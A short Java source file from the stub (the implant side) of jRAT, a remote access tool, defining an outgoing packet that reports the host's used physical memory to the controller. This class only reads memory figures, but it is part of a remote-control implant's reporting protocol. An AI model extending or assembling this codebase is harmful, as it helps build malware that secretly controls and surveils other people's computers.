package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;
import java.lang.management.ManagementFactory;

import com.sun.management.OperatingSystemMXBean;


public class Packet24UsedMemory extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		long total = ((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
		long free = ((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getFreePhysicalMemorySize();

		dos.writeLong(total - free);
	}

	@Override
	public short getPacketId() {
		return 24;
	}

}
